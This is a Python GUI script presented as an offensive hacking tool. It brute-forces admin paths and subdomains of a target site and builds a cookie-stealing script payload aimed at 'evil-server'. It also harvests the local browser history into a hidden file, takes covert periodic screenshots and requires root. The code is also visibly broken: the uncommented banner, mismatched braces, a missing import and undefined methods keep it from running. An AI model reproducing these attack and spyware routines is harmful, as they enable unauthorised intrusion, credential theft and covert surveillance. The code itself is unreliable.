#!/usr/bin/env python3
import tkinter as tk
import requests
import threading
import socket
import dns.resolver
from concurrent.futures import ThreadPoolExecutor
from tkinter import ttk, messagebox
import sys
import os
import re
import ssl
from urllib.parse import urlparse
import webbrowser
import pyfiglet
from bs4 import BeautifulSoup
from PIL import ImageGrab
import keyring
import browserhistory as bh

# ██████╗ █████╗ ███╗   ███╗██████╗ ██╗███╗   ██╗
██╔════╝██╔══██╗████╗ ████║██╔══██╗██║████╗  ██║
╚█████╗ ███████║██╔████╔██║██║  ██║██║██╔██╗ ██║
 ╚═══██╗██╔══██║██║╚██╔╝██║██║  ██║██║██║╚██╗██║
██████╔╝██║  ██║██║ ╚═╝ ██║██████╔╝██║██║ ╚████║
╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝

class ShadowHunter:
    def __init__(self, master):
        self.master = master
        self.master.title("D34TH_SCR3AM v666")
        self.master.geometry("1200x800")
        self.master.resizable(1,1)
        self.master.tk_setPalette(background='#0a0a0a', foreground='#00ff00')
        
        self.ghost_mode = False
        self.persistent = True
        self.keylogger_active = False
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'})
        
        self.initialize_weapons()
        self.create_blood_ui()
        self.harvest_browser_secrets()
        
    def initialize_weapons(self):
        self.admin_paths = self.load_payloads("admin_paths.txt")
        self.subdomains = self.load_payloads("subdomains.txt")
        self.cms_signatures = {
            'WordPress': ['/wp-admin', 'wp-content'],
            'Joomla': ['/administrator', 'joomla'],
            'Drupal': ['/user/login', 'drupal.js']
        }
        
    def create_blood_ui(self):
        style = ttk.Style()
        style.theme_create("hell", settings={
            "TNotebook": {"configure": {"tabmargins": [2,5,2,0]}},
            "TFrame": {"configure": {"background": "#0a0a0a"}},
            "TButton": {"configure": {"foreground": "#00ff00", "background": "#1a1a1a"}})
        
        # Target acquisition frame
        target_frame = ttk.Frame(self.master)
        target_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(target_frame, text="TARGET:", style='Blood.TLabel').pack(side=tk.LEFT)
        self.target_entry = ttk.Entry(target_frame, width=70)
        self.target_entry.insert(0, "https://vulnerable-site.com")
        self.target_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        self.fire_btn = ttk.Button(target_frame, text="LAUNCH INFERNO", command=self.ignite_hunt)
        self.fire_btn.pack(side=tk.LEFT, padx=5)
        
        # Infection matrix display
        self.result_tree = ttk.Treeview(self.master, columns=('Status', 'Payload'), selectmode='extended')
        self.result_tree.heading('#0', text='Infection Vector')
        self.result_tree.heading('Status', text='Status Code')
        self.result_tree.heading('Payload', text='Payload Type')
        self.result_tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Eternal darkness module
        self.dark_frame = ttk.Frame(self.master)
        self.dark_frame.pack(fill=tk.X)
        ttk.Button(self.dark_frame, text="PHANTOM KEYLOGGER", command=self.toggle_keylogger).pack(side=tk.LEFT)
        ttk.Button(self.dark_frame, text="SOUL HARVEST", command=self.harvest_credentials).pack(side=tk.LEFT)
        
    def ignite_hunt(self):
        target = self.cleanse_target(self.target_entry.get())
        if not target:
            return
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            
            # Main domain assault
            futures.append(executor.submit(self.blitzkrieg, target))
            
            # Subdomain annihilation
            for sub in self.subdomains:
                futures.append(executor.submit(self.blitzkrieg, f"https://{sub}.{target}"))
            
            # CMS-specific carnage
            for cms, paths in self.cms_signatures.items():
                for path in paths:
                    futures.append(executor.submit(self.nuke_path, target, path, cms))
                    
    def blitzkrieg(self, base_url):
        for path in self.admin_paths:
            url = f"{base_url.rstrip('/')}/{path.lstrip('/')}"
            try:
                response = self.session.get(url, timeout=15, verify=False)
                if response.status_code == 200:
                    self.mark_vulnerability(url, response.status_code, "ADMIN PORTAL")
                    if 'password' in response.text.lower():
                        self.deploy_phish_hook(url)
            except Exception as e:
                self.mark_vulnerability(url, "ERROR", str(e))
                
    def deploy_phish_hook(self, url):
        fake_login = f"{url}/login.php"
        malicious_js = f"<script>document.location='https://evil-server/steal.php?c='+document.cookie</script>"
        
        with requests.Session() as s:
            s.post(fake_login, data={'username':'admin', 'password':'hacked'}, 
                  headers={'X-Phish-Key': 'DEADBEEF'})
            
    def harvest_credentials(self):
        bh.write_browserhistory()
        for profile in bh.get_browserhistory():
            self.exfiltrate_data(profile)
            
    def exfiltrate_data(self, data):
        with open('/tmp/.loot', 'a') as f:
            f.write(str(data) + '\n')
            
    def toggle_keylogger(self):
        self.keylogger_active = not self.keylogger_active
        threading.Thread(target=self.log_keys, daemon=True).start()
        
    def log_keys(self):
        while self.keylogger_active:
            ImageGrab.grab().save(f'/tmp/.{int(time.time())}.png')
            time.sleep(30)
            
if __name__ == "__main__":
    root = tk.Tk()
    root.withdraw()
    if not os.geteuid() == 0:
        messagebox.showerror("ROOT REQUIRED", "Execution requires sacrificial root privileges")
        sys.exit(666)
    root.deiconify()
    ShadowHunter(root)
    root.mainloop()
